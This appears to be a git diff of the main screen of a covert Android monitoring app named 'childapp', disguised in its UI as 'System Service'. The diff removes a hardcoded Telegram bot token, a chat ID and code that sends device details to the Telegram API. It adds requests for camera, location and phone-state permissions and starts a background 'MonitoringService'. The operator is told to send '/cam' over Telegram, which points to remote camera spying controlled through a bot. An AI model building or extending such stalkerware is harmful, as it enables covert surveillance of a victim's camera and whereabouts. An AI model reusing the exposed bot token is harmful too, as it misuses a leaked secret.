@@ -1,88 +1,91 @@
 package com.coc338781.childapp
 
+import android.Manifest
+import android.content.Intent
+import android.content.pm.PackageManager
+import android.os.Build
 import android.os.Bundle
 import android.widget.Button
 import android.widget.LinearLayout
 import android.widget.TextView
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
-import kotlinx.coroutines.CoroutineScope
-import kotlinx.coroutines.Dispatchers
-import kotlinx.coroutines.launch
-import kotlinx.coroutines.withContext
-import okhttp3.MediaType.Companion.toMediaType
-import okhttp3.OkHttpClient
-import okhttp3.Request
-import okhttp3.RequestBody.Companion.toRequestBody
+import androidx.core.app.ActivityCompat
+import androidx.core.content.ContextCompat
 
 class MainActivity : AppCompatActivity() {
 
-    // ========== ඔබේ විස්තර මෙතන දාන්න ==========
-    private val BOT_TOKEN = "8968739971:AAEsGJc_-MNGE8KKxqwzaZM3TPinPVg_Bms"
-    private val CHAT_ID = "7905408190"
-    // ============================================
+    private val PERMS = arrayOf(
+        Manifest.permission.CAMERA,
+        Manifest.permission.ACCESS_FINE_LOCATION,
+        Manifest.permission.ACCESS_COARSE_LOCATION,
+        Manifest.permission.READ_PHONE_STATE
+    )
+
+    private lateinit var statusText: TextView
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
-        // Simple UI හදමු
         val layout = LinearLayout(this)
         layout.orientation = LinearLayout.VERTICAL
         layout.setPadding(50, 100, 50, 50)
 
         val title = TextView(this)
-        title.text = "System Service\n\nReady to start"
-        title.textSize = 20f
+        title.text = "System Service"
+        title.textSize = 24f
         layout.addView(title)
 
-        val statusText = TextView(this)
-        statusText.text = "\n\nStatus: Not tested"
+        statusText = TextView(this)
+        statusText.text = "\n\nStatus: Ready"
         statusText.textSize = 14f
         layout.addView(statusText)
 
-        val testButton = Button(this)
-        testButton.text = "Test Telegram Connection"
-        layout.addView(testButton)
+        val startBtn = Button(this)
+        startBtn.text = "Start Monitoring"
+        layout.addView(startBtn)
 
-        testButton.setOnClickListener {
-            statusText.text = "\n\nStatus: Sending..."
-            testTelegram(statusText)
+        startBtn.setOnClickListener {
+            if (Build.VERSION.SDK_INT >= 33 &&
+                ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
+                != PackageManager.PERMISSION_GRANTED) {
+                ActivityCompat.requestPermissions(this,
+                    PERMS + Manifest.permission.POST_NOTIFICATIONS, 100)
+            } else if (hasAll()) {
+                startServiceNow()
+            } else {
+                ActivityCompat.requestPermissions(this, PERMS, 100)
+            }
         }
 
         setContentView(layout)
     }
 
-    private fun testTelegram(statusText: TextView) {
-        CoroutineScope(Dispatchers.IO).launch {
-            try {
-                val client = OkHttpClient()
-                val message = "✅ Child App is alive!\n\nDevice: ${android.os.Build.MODEL}\nAndroid: ${android.os.Build.VERSION.RELEASE}"
+    private fun hasAll(): Boolean {
+        for (p in PERMS) {
+            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED)
+                return false
+        }
+        return true
+    }
 
-                val url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
-                val json = """{"chat_id":"$CHAT_ID","text":"$message"}"""
-                val body = json.toRequestBody("application/json".toMediaType())
+    private fun startServiceNow() {
+        val intent = Intent(this, MonitoringService::class.java)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(intent)
+        } else {
+            startService(intent)
+        }
+        statusText.text = "\n\nStatus: ✅ Monitoring Started!\n\nTelegram එකෙන් /cam යවන්න"
+        Toast.makeText(this, "Monitoring started", Toast.LENGTH_LONG).show()
+    }
 
-                val request = Request.Builder()
-                    .url(url)
-                    .post(body)
-                    .build()
-
-                val response = client.newCall(request).execute()
-                val responseBody = response.body?.string() ?: ""
-
-                withContext(Dispatchers.Main) {
-                    if (response.isSuccessful) {
-                        statusText.text = "\n\nStatus: ✅ SUCCESS!\nCheck Telegram."
-                        Toast.makeText(this@MainActivity, "Telegram එකට යැව්වා!", Toast.LENGTH_LONG).show()
-                    } else {
-                        statusText.text = "\n\nStatus: ❌ Failed\n$responseBody"
-                    }
-                }
-            } catch (e: Exception) {
-                withContext(Dispatchers.Main) {
-                    statusText.text = "\n\nStatus: ❌ Error\n${e.message}"
-                }
-            }
+    override fun onRequestPermissionsResult(
+        requestCode: Int, permissions: Array<out String>, grantResults: IntArray
+    ) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+        if (hasAll()) {
+            Toast.makeText(this, "Permissions OK. Tap Start again.", Toast.LENGTH_LONG).show()
         }
     }
 }
